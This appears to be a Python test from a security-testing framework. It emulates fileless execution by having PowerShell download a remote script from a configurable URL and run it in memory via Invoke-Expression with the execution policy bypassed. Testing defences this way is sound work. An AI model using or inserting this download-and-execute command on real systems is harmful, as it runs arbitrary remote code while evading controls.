import subprocess
from typing import Dict
from executor.BaseTest import BaseTest


class PowerShellMemoryExecutionTest(BaseTest):
    TEST_NAME = "powershell_memory_execution"
    CATEGORY  = "code_execution"

    # Fallback if no URL in your config file
    DEFAULT_URL = (
        "https://raw.githubusercontent.com/"
        "tomstryhn/PowerShell-InMemory-Execution/"
        "main/codesamples/VeryFriendlyCode.ps1"
    )

    def run(self, _config: Dict) -> Dict:
        """
        Downloads a remote PowerShell script and executes it entirely in memory.
        Reads its parameters from configs/code_execution.json under the key
        'powershell_memory_execution.url'.
        """
        # 1) load your simple JSON section
        cfg = self.load_config()
        url = cfg.get("url", self.DEFAULT_URL)

        # 2) build the in-memory command exactly as you specified
        ps_script = (
            f"$remoteURL = '{url}'; "
            "$remoteCode = (Invoke-WebRequest -Uri $remoteURL -UseBasicParsing).Content; "
            "Invoke-Expression -Command $remoteCode"
        )
        cmd = [
            "powershell.exe",
            "-NoProfile",          # avoid profile overhead/interference
            "-ExecutionPolicy", "Bypass",
            "-Command", ps_script
        ]

        # 3) run & log that single step
        @self.log_command(name="PowerShell In-Memory Exec")
        def do_execute():
            # execute_command returns dict with stdout/stderr/return_code etc.
            # pass the list form so subprocess avoids extra shell quoting
            return self.execute_command(cmd)

        step = do_execute()

        # 4) derive pass/fail and comment
        status  = "success" if step["return_code"] == 0 else "failure"
        comment = step["stderr"] or step["stdout"] or ""

        return {
            "status":           status,
            "executed_command": " ".join(cmd),
            "comment":          comment
        }
